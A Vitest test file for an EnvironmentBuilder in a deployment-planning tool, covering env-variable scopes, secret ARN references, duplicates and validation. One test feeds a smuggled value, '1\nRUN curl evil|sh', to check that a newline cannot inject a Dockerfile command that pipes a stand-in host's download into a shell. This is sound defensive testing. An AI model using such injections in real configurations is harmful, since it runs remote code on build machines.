import { describe, expect, it } from "vitest";
import { createPlan } from "../../../core/plan.js";
import { EnvironmentBuilder } from "../../../core/plan-builder/environment.js";

describe("EnvironmentBuilder", () => {
  it("normalizes literal scopes and passthrough references", () => {
    const plan = createPlan("test");
    const builder = new EnvironmentBuilder(plan);

    builder.add("BUILD_ONLY", { value: "build", scope: "build" });
    builder.add("BOTH", { value: "both", scope: "both" });
    builder.add("DATABASE_URL", {
      from: { env: "DATABASE_URL" },
      required: true,
      default: "local",
    });

    expect(plan.build.environment).toEqual({ BUILD_ONLY: "build", BOTH: "both" });
    expect(plan.runtime.environment).toEqual({ BOTH: "both" });
    expect(plan.runtime.envVars).toEqual([
      { key: "BUILD_ONLY", scope: "build", value: "build" },
      { key: "BOTH", scope: "both", value: "both" },
      {
        key: "DATABASE_URL",
        scope: "runtime",
        from: { env: "DATABASE_URL" },
        required: true,
        default: "local",
      },
    ]);
  });

  it("rejects invalid, duplicate, and unsafe declarations", () => {
    const builder = new EnvironmentBuilder(createPlan("test"));
    builder.add("DEBUG", { value: "1" });

    expect(() => builder.add("DEBUG", { value: "0" })).toThrow("Duplicate env variable");
    expect(() => builder.add("1INVALID", { value: "1" })).toThrow("key must match");
    expect(() => builder.add("PORT", { from: { env: "PORT" }, default: "8:000" })).toThrow(
      "not safe inside a Docker Compose interpolation default",
    );
  });

  it("ignores identical duplicate declarations", () => {
    const plan = createPlan("test");
    const builder = new EnvironmentBuilder(plan);
    builder.add("OPENAI_API_KEY", { from: { env: "OPENAI_API_KEY" } });
    builder.add("OPENAI_API_KEY", { from: { env: "OPENAI_API_KEY" } });
    builder.add("DEBUG", { value: "1" });
    builder.add("DEBUG", { value: "1" });

    expect(plan.runtime.envVars).toEqual([
      { key: "OPENAI_API_KEY", scope: "runtime", from: { env: "OPENAI_API_KEY" } },
      { key: "DEBUG", scope: "runtime", value: "1" },
    ]);
  });

  it("normalizes AWS secret ARN references and treats them as passthrough", () => {
    const plan = createPlan("test");
    const builder = new EnvironmentBuilder(plan);

    const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:pg-AbCdEf";
    builder.add("POSTGRES_PASSWORD", { from: { secretArn } });
    // Identical re-declaration is ignored like any other duplicate.
    builder.add("POSTGRES_PASSWORD", { from: { secretArn } });

    expect(plan.runtime.envVars).toEqual([
      { key: "POSTGRES_PASSWORD", scope: "runtime", from: { secretArn } },
    ]);
  });

  it("rejects malformed AWS secret ARN references", () => {
    const builder = new EnvironmentBuilder(createPlan("test"));
    expect(() =>
      builder.add("API_TOKEN", {
        from: { secretArn: "arn:aws:s3:::not-a-secret" } as never,
      }),
    ).toThrow(/Secrets Manager or SSM Parameter Store ARN/);
  });

  it("rejects literal values containing control characters", () => {
    const builder = new EnvironmentBuilder(createPlan("test"));
    // A newline in a literal env value would inject an extra Dockerfile
    // ENV/instruction line.
    expect(() => builder.add("FLAG", { value: "1\nRUN curl evil|sh" })).toThrow(
      /control characters/,
    );
    expect(() => builder.add("CR", { value: "a\rb" })).toThrow(/control characters/);
  });
});
